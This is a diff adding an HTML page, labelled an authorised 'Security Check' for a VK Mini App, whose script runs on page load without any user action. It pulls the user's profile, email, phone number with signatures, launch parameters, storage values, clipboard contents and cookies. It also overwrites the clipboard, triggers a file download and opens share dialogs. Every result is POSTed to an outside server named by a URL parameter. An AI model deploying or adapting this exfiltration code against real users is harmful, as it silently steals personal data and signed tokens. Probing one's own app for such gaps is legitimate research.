@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Check</title>
+<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" defer></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:20px;max-width:520px;margin:0 auto 14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.logo{width:48px;height:48px;background:#0077ff;border-radius:12px;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;font-weight:700}
+h2{font-size:17px;font-weight:600;text-align:center;margin-bottom:4px}
+.sub{font-size:11px;color:#818c99;text-align:center;margin-bottom:14px;line-height:1.5}
+.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;margin-left:6px;vertical-align:middle}
+.p-ok{background:#e3f8e9;color:#2eb851}.p-run{background:#e6f2ff;color:#0077ff}.p-fail{background:#ffe4e4;color:#e64646}.p-wait{background:#eee;color:#818c99}.p-crit{background:#ff5252;color:#fff}
+.section{font-size:13px;font-weight:600;color:#0077ff;margin:14px 0 6px;padding-top:10px;border-top:1px solid #f0f0f0}
+.row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f7f7f7}
+.row:last-child{border-bottom:none}
+.rname{font-size:12px;color:#000;font-weight:500}
+.rdesc{font-size:10px;color:#818c99;margin-top:2px;line-height:1.4}
+.verdict{border-radius:10px;padding:12px;margin:10px 0;font-size:14px;font-weight:650;text-align:center;line-height:1.4}
+.v-wait{background:#eee;color:#818c99}.v-leak{background:#ffe4e4;color:#c00}.v-ok{background:#e8f5e9;color:#1b5e20}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:ui-monospace,monospace;font-size:10px;color:#aaa;max-height:400px;overflow-y:auto;margin-top:12px}
+#log p{margin:2px 0;line-height:1.4}
+.l-ok{color:#4caf50}.l-warn{color:#ffa726}.l-err{color:#ef5350}.l-crit{color:#ff5252;font-weight:700}.l-info{color:#64b5f6}
+.env{background:#f7f8fa;border-radius:8px;padding:8px 12px;font-size:10px;font-family:monospace;color:#818c99;margin-bottom:10px;word-break:break-all}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">VK</div>
+  <h2>Security Check</h2>
+  <p class="sub">Authorized security research — own account only.<br>
+    Tests VK Bridge file/data methods + Web File APIs on auto-launch (no gesture).</p>
+  <div class="env" id="env">Detecting…</div>
+  <div class="verdict v-wait" id="verdict">Running probes…</div>
+
+  <!-- VK Bridge file/data methods -->
+  <div class="section">VK Bridge — File &amp; Data Methods (auto-fire)</div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppDownloadFile <span class="pill p-wait" id="s-download">WAIT</span></div>
+    <div class="rdesc">Silent file download to device — drive-by drop test</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppCopyText <span class="pill p-wait" id="s-copy">WAIT</span></div>
+    <div class="rdesc">Silent clipboard write — overwrite without gesture</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppCallAPIMethod <span class="pill p-wait" id="s-api">WAIT</span></div>
+    <div class="rdesc">Raw VK API call (account.getInfo) — data exfil via bridge</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetUserInfo <span class="pill p-wait" id="s-userinfo">WAIT</span></div>
+    <div class="rdesc">User profile: name, DOB, photos, city</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetEmail <span class="pill p-wait" id="s-email">WAIT</span></div>
+    <div class="rdesc">User email + cryptographic sign</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetPhoneNumber <span class="pill p-wait" id="s-phone">WAIT</span></div>
+    <div class="rdesc">User phone number + sign</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetLaunchParams <span class="pill p-wait" id="s-launch">WAIT</span></div>
+    <div class="rdesc">Launch params with signed data</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppGetGrantedPermissions <span class="pill p-wait" id="s-perms">WAIT</span></div>
+    <div class="rdesc">Currently granted permissions list</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppStorageGetKeys <span class="pill p-wait" id="s-storkeys">WAIT</span></div>
+    <div class="rdesc">Enumerate all storage keys visible to this app</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppShowImages <span class="pill p-wait" id="s-images">WAIT</span></div>
+    <div class="rdesc">Open native image viewer with attacker-controlled URLs</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">VKWebAppShare <span class="pill p-wait" id="s-share">WAIT</span></div>
+    <div class="rdesc">Trigger share dialog with attacker link on auto-launch</div>
+  </div></div>
+
+  <!-- Web File APIs -->
+  <div class="section">Web File APIs in VK WebView (auto-fire)</div>
+
+  <div class="row"><div>
+    <div class="rname">clipboard.readText <span class="pill p-wait" id="s-clipread">WAIT</span></div>
+    <div class="rdesc">Read clipboard without gesture — exfil copied text</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">clipboard.read <span class="pill p-wait" id="s-clipfull">WAIT</span></div>
+    <div class="rdesc">Read clipboard all formats (images, files)</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">showOpenFilePicker <span class="pill p-wait" id="s-filepick">WAIT</span></div>
+    <div class="rdesc">File System Access API — open file picker</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">showDirectoryPicker <span class="pill p-wait" id="s-dirpick">WAIT</span></div>
+    <div class="rdesc">Directory access API — browse filesystem</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">navigator.share <span class="pill p-wait" id="s-webshare">WAIT</span></div>
+    <div class="rdesc">Web Share API with file (Blob→File)</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">Cache API enum <span class="pill p-wait" id="s-cache">WAIT</span></div>
+    <div class="rdesc">Enumerate CacheStorage keys visible in WebView</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">document.cookie <span class="pill p-wait" id="s-cookie">WAIT</span></div>
+    <div class="rdesc">Read cookies accessible from iframe/WebView context</div>
+  </div></div>
+
+  <div class="row"><div>
+    <div class="rname">indexedDB.databases <span class="pill p-wait" id="s-idb">WAIT</span></div>
+    <div class="rdesc">Enumerate IndexedDB databases</div>
+  </div></div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+const q = new URLSearchParams(location.search);
+const SRV = q.get('srv') || '';
+const APP_ID = q.get('vk_app_id') || '(unknown)';
+const USER_ID = q.get('vk_user_id') || '(unknown)';
+
+let hits = 0, total = 0;
+
+function ts(){ return new Date().toTimeString().slice(0,8); }
+function lg(msg, cls){
+  const d = document.getElementById('log');
+  const p = document.createElement('p');
+  if(cls) p.className = 'l-' + cls;
+  p.textContent = '[' + ts() + '] ' + msg;
+  d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function pill(id, txt, cls){
+  const e = document.getElementById(id);
+  if(e){ e.textContent = txt; e.className = 'pill ' + cls; }
+}
+async function post(type, data){
+  if(!SRV) return;
+  try{
+    await fetch(SRV + '/log?type=' + encodeURIComponent(type), {
+      method: 'POST',
+      headers: {'Content-Type':'application/json', 'ngrok-skip-browser-warning':'true'},
+      body: JSON.stringify({...data, app_id: APP_ID, user_id: USER_ID, _ts: Date.now(),
+        ua: navigator.userAgent, href: location.href})
+    });
+  }catch(e){}
+}
+
+function markResult(id, ok, detail){
+  total++;
+  if(ok){ hits++; pill(id, 'HIT', 'p-crit'); }
+  else { pill(id, 'blocked', 'p-fail'); }
+  updateVerdict();
+}
+function updateVerdict(){
+  const v = document.getElementById('verdict');
+  if(hits > 0){
+    v.textContent = `${hits}/${total} methods succeeded on auto-launch — data exfiltration possible`;
+    v.className = 'verdict v-leak';
+  } else {
+    v.textContent = `0/${total} — all blocked so far`;
+    v.className = 'verdict v-ok';
+  }
+}
+
+// ── VK Bridge probes (all fire on page load, no gesture) ──
+
+async function probeVKDownloadFile(){
+  try{
+    const r = await vkBridge.send('VKWebAppDownloadFile', {
+      url: (SRV || 'https://etho0.github.io') + '/vk_file_probe.html',
+      filename: 'probe_download_test.html'
+    });
+    lg('VKWebAppDownloadFile: OK — ' + JSON.stringify(r), 'crit');
+    post('FILE_DOWNLOAD_HIT', {result: r});
+    markResult('s-download', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppDownloadFile: ' + err, 'err');
+    post('FILE_DOWNLOAD_FAIL', {error: err});
+    markResult('s-download', false, err);
+  }
+}
+
+async function probeVKCopyText(){
+  try{
+    const r = await vkBridge.send('VKWebAppCopyText', {
+      text: 'PROBE_CLIPBOARD_' + Date.now()
+    });
+    lg('VKWebAppCopyText: OK — clipboard overwritten silently', 'crit');
+    post('COPY_TEXT_HIT', {result: r});
+    markResult('s-copy', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppCopyText: ' + err, 'err');
+    post('COPY_TEXT_FAIL', {error: err});
+    markResult('s-copy', false, err);
+  }
+}
+
+async function probeVKCallAPI(){
+  try{
+    const r = await vkBridge.send('VKWebAppCallAPIMethod', {
+      method: 'account.getInfo',
+      params: { v: '5.131' }
+    });
+    lg('VKWebAppCallAPIMethod(account.getInfo): OK — ' + JSON.stringify(r).slice(0,300), 'crit');
+    post('API_CALL_HIT', {method: 'account.getInfo', result: JSON.stringify(r).slice(0,500)});
+    markResult('s-api', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,300) : String(e);
+    lg('VKWebAppCallAPIMethod: ' + err, 'err');
+    post('API_CALL_FAIL', {error: err});
+    markResult('s-api', false, err);
+  }
+}
+
+async function probeVKUserInfo(){
+  try{
+    const r = await vkBridge.send('VKWebAppGetUserInfo', {});
+    lg('VKWebAppGetUserInfo: ' + r.first_name + ' ' + r.last_name + ' id=' + r.id, 'crit');
+    post('USERINFO_HIT', {id: r.id, name: r.first_name + ' ' + r.last_name, bdate: r.bdate,
+      photo: r.photo_200, city: r.city?.title, country: r.country?.title});
+    markResult('s-userinfo', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppGetUserInfo: ' + err, 'err');
+    post('USERINFO_FAIL', {error: err});
+    markResult('s-userinfo', false, err);
+  }
+}
+
+async function probeVKEmail(){
+  try{
+    const r = await vkBridge.send('VKWebAppGetEmail', {});
+    lg('VKWebAppGetEmail: ' + r.email + ' sign=' + (r.sign||'').slice(0,20) + '…', 'crit');
+    post('EMAIL_HIT', {email: r.email, sign: r.sign});
+    markResult('s-email', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppGetEmail: ' + err, 'err');
+    post('EMAIL_FAIL', {error: err});
+    markResult('s-email', false, err);
+  }
+}
+
+async function probeVKPhone(){
+  try{
+    const r = await vkBridge.send('VKWebAppGetPhoneNumber', {});
+    lg('VKWebAppGetPhoneNumber: ' + r.phone_number + ' verified=' + r.is_verified, 'crit');
+    post('PHONE_HIT', {phone: r.phone_number, sign: r.sign, verified: r.is_verified});
+    markResult('s-phone', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppGetPhoneNumber: ' + err, 'err');
+    post('PHONE_FAIL', {error: err});
+    markResult('s-phone', false, err);
+  }
+}
+
+async function probeVKLaunchParams(){
+  try{
+    const r = await vkBridge.send('VKWebAppGetLaunchParams', {});
+    lg('VKWebAppGetLaunchParams: ' + JSON.stringify(r).slice(0,300), 'crit');
+    post('LAUNCH_PARAMS_HIT', {result: JSON.stringify(r).slice(0,500)});
+    markResult('s-launch', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppGetLaunchParams: ' + err, 'err');
+    post('LAUNCH_PARAMS_FAIL', {error: err});
+    markResult('s-launch', false, err);
+  }
+}
+
+async function probeVKGrantedPerms(){
+  try{
+    const r = await vkBridge.send('VKWebAppGetGrantedPermissions', {});
+    lg('VKWebAppGetGrantedPermissions: ' + JSON.stringify(r).slice(0,300), 'crit');
+    post('GRANTED_PERMS_HIT', {result: JSON.stringify(r).slice(0,500)});
+    markResult('s-perms', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppGetGrantedPermissions: ' + err, 'err');
+    post('GRANTED_PERMS_FAIL', {error: err});
+    markResult('s-perms', false, err);
+  }
+}
+
+async function probeVKStorageKeys(){
+  try{
+    const r = await vkBridge.send('VKWebAppStorageGetKeys', {count: 100, offset: 0});
+    const keys = (r && r.keys) ? r.keys : [];
+    lg('VKWebAppStorageGetKeys: ' + keys.length + ' keys — ' + JSON.stringify(keys).slice(0,200), keys.length ? 'crit' : 'warn');
+    post('STORAGE_KEYS_HIT', {count: keys.length, keys: keys});
+    markResult('s-storkeys', true, r);
+    if(keys.length > 0){
+      try{
+        const vals = await vkBridge.send('VKWebAppStorageGet', {keys: keys.slice(0,5)});
+        lg('StorageGet(first 5): ' + JSON.stringify(vals).slice(0,300), 'crit');
+        post('STORAGE_VALUES_HIT', {result: JSON.stringify(vals).slice(0,500)});
+      }catch(e2){}
+    }
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppStorageGetKeys: ' + err, 'err');
+    post('STORAGE_KEYS_FAIL', {error: err});
+    markResult('s-storkeys', false, err);
+  }
+}
+
+async function probeVKShowImages(){
+  try{
+    const r = await vkBridge.send('VKWebAppShowImages', {
+      images: ['https://etho0.github.io/vk_file_probe.html'],
+      start_index: 0
+    });
+    lg('VKWebAppShowImages: OK — native viewer opened on launch', 'crit');
+    post('SHOW_IMAGES_HIT', {result: r});
+    markResult('s-images', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppShowImages: ' + err, 'err');
+    post('SHOW_IMAGES_FAIL', {error: err});
+    markResult('s-images', false, err);
+  }
+}
+
+async function probeVKShare(){
+  try{
+    const r = await vkBridge.send('VKWebAppShare', {
+      link: 'https://etho0.github.io/vk_file_probe.html'
+    });
+    lg('VKWebAppShare: OK — share dialog opened on auto-launch', 'crit');
+    post('SHARE_HIT', {result: JSON.stringify(r).slice(0,300)});
+    markResult('s-share', true, r);
+  }catch(e){
+    const err = typeof e === 'object' ? JSON.stringify(e).slice(0,200) : String(e);
+    lg('VKWebAppShare: ' + err, 'err');
+    post('SHARE_FAIL', {error: err});
+    markResult('s-share', false, err);
+  }
+}
+
+// ── Web File APIs ──
+
+async function probeClipboardRead(){
+  try{
+    const text = await navigator.clipboard.readText();
+    lg('clipboard.readText: "' + text.slice(0,100) + '"', 'crit');
+    post('CLIPBOARD_READ_HIT', {text: text.slice(0,500)});
+    markResult('s-clipread', true, text);
+  }catch(e){
+    lg('clipboard.readText: ' + e.name + ' — ' + e.message, 'err');
+    post('CLIPBOARD_READ_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-clipread', false, e.message);
+  }
+}
+
+async function probeClipboardFull(){
+  try{
+    const items = await navigator.clipboard.read();
+    const types = [];
+    for(const item of items) types.push(...item.types);
+    lg('clipboard.read: ' + types.length + ' type(s) — ' + types.join(', '), 'crit');
+    post('CLIPBOARD_FULL_HIT', {types: types});
+    markResult('s-clipfull', true, types);
+  }catch(e){
+    lg('clipboard.read: ' + e.name + ' — ' + e.message, 'err');
+    post('CLIPBOARD_FULL_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-clipfull', false, e.message);
+  }
+}
+
+async function probeFilePicker(){
+  try{
+    if(!window.showOpenFilePicker){ throw new Error('API not available'); }
+    const handles = await window.showOpenFilePicker();
+    lg('showOpenFilePicker: opened! ' + handles.length + ' file(s)', 'crit');
+    post('FILE_PICKER_HIT', {count: handles.length});
+    markResult('s-filepick', true, handles);
+  }catch(e){
+    lg('showOpenFilePicker: ' + (e.name || '') + ' — ' + e.message, 'err');
+    post('FILE_PICKER_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-filepick', false, e.message);
+  }
+}
+
+async function probeDirPicker(){
+  try{
+    if(!window.showDirectoryPicker){ throw new Error('API not available'); }
+    const handle = await window.showDirectoryPicker();
+    lg('showDirectoryPicker: opened! name=' + handle.name, 'crit');
+    post('DIR_PICKER_HIT', {name: handle.name});
+    markResult('s-dirpick', true, handle);
+  }catch(e){
+    lg('showDirectoryPicker: ' + (e.name || '') + ' — ' + e.message, 'err');
+    post('DIR_PICKER_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-dirpick', false, e.message);
+  }
+}
+
+async function probeWebShare(){
+  try{
+    if(!navigator.share){ throw new Error('API not available'); }
+    const blob = new Blob(['probe_test_data'], {type: 'text/plain'});
+    const file = new File([blob], 'probe.txt', {type: 'text/plain'});
+    if(navigator.canShare && !navigator.canShare({files: [file]})){
+      throw new Error('canShare returned false for files');
+    }
+    await navigator.share({files: [file], title: 'Probe', text: 'test'});
+    lg('navigator.share(files): OK — share sheet opened on auto-launch', 'crit');
+    post('WEB_SHARE_HIT', {});
+    markResult('s-webshare', true, true);
+  }catch(e){
+    lg('navigator.share: ' + (e.name || '') + ' — ' + e.message, 'err');
+    post('WEB_SHARE_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-webshare', false, e.message);
+  }
+}
+
+async function probeCacheAPI(){
+  try{
+    if(!window.caches){ throw new Error('CacheStorage not available'); }
+    const keys = await caches.keys();
+    lg('caches.keys: ' + keys.length + ' cache(s) — ' + keys.join(', '), keys.length ? 'crit' : 'warn');
+    post('CACHE_ENUM_HIT', {keys: keys});
+    markResult('s-cache', keys.length > 0, keys);
+  }catch(e){
+    lg('caches.keys: ' + (e.name || '') + ' — ' + e.message, 'err');
+    post('CACHE_ENUM_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-cache', false, e.message);
+  }
+}
+
+function probeCookies(){
+  try{
+    const c = document.cookie;
+    lg('document.cookie: "' + (c || '(empty)').slice(0,200) + '"', c ? 'crit' : 'info');
+    post('COOKIE_READ', {cookie: c.slice(0,500), length: c.length});
+    markResult('s-cookie', c.length > 0, c);
+  }catch(e){
+    lg('document.cookie: ' + e.message, 'err');
+    markResult('s-cookie', false, e.message);
+  }
+}
+
+async function probeIDB(){
+  try{
+    if(!indexedDB.databases){ throw new Error('indexedDB.databases not available'); }
+    const dbs = await indexedDB.databases();
+    lg('indexedDB.databases: ' + dbs.length + ' db(s) — ' + dbs.map(d=>d.name).join(', '), dbs.length ? 'crit' : 'info');
+    post('IDB_ENUM', {count: dbs.length, names: dbs.map(d=>d.name)});
+    markResult('s-idb', dbs.length > 0, dbs);
+  }catch(e){
+    lg('indexedDB.databases: ' + (e.name || '') + ' — ' + e.message, 'err');
+    post('IDB_ENUM_FAIL', {error: e.name + ': ' + e.message});
+    markResult('s-idb', false, e.message);
+  }
+}
+
+// ── Boot sequence ──
+
+function detectEnv(){
+  const e = document.getElementById('env');
+  const ao = (() => { try { return JSON.stringify(location.ancestorOrigins ? [...location.ancestorOrigins] : 'N/A'); } catch(x){ return 'blocked'; } })();
+  e.innerHTML = `app_id: <b>${APP_ID}</b> | user_id: <b>${USER_ID}</b><br>` +
+    `origin: ${location.origin} | ancestors: ${ao}<br>` +
+    `inIframe: ${self!==top} | vkBridge: ${!!window.vkBridge}<br>` +
+    `UA: ${navigator.userAgent.slice(0,80)}…`;
+  post('ENV', {
+    origin: location.origin, ancestors: ao,
+    inIframe: self !== top, hasBridge: !!window.vkBridge,
+    referrer: document.referrer
+  });
+}
+
+async function boot(){
+  detectEnv();
+
+  // wait for vkBridge script to load
+  for(let i = 0; i < 30 && !window.vkBridge; i++){
+    await new Promise(r => setTimeout(r, 150));
+  }
+  detectEnv();
+
+  if(!window.vkBridge){
+    lg('vkBridge not loaded — VK Bridge probes will fail (not in Mini App context?)', 'err');
+  } else {
+    try{
+      await vkBridge.send('VKWebAppInit');
+      lg('VKWebAppInit: OK', 'ok');
+    }catch(e){
+      lg('VKWebAppInit failed: ' + JSON.stringify(e).slice(0,200), 'err');
+    }
+  }
+
+  lg('=== AUTO-LAUNCH PROBE START — zero gesture ===', 'warn');
+  post('PROBE_START', {phase: 'auto_launch'});
+
+  // Fire all probes concurrently — the key question is which succeed without gesture
+  const vkProbes = window.vkBridge ? [
+    probeVKUserInfo(),
+    probeVKLaunchParams(),
+    probeVKGrantedPerms(),
+    probeVKEmail(),
+    probeVKPhone(),
+    probeVKCopyText(),
+    probeVKDownloadFile(),
+    probeVKCallAPI(),
+    probeVKStorageKeys(),
+    probeVKShowImages(),
+    probeVKShare(),
+  ] : [];
+
+  const webProbes = [
+    probeClipboardRead(),
+    probeClipboardFull(),
+    probeFilePicker(),
+    probeDirPicker(),
+    probeWebShare(),
+    probeCacheAPI(),
+    probeIDB(),
+  ];
+  probeCookies();
+
+  await Promise.allSettled([...vkProbes, ...webProbes]);
+
+  lg('=== AUTO-LAUNCH PROBE COMPLETE ===', 'warn');
+  post('PROBE_DONE', {hits: hits, total: total});
+  updateVerdict();
+}
+
+boot();
+</script>
+</body>
+</html>
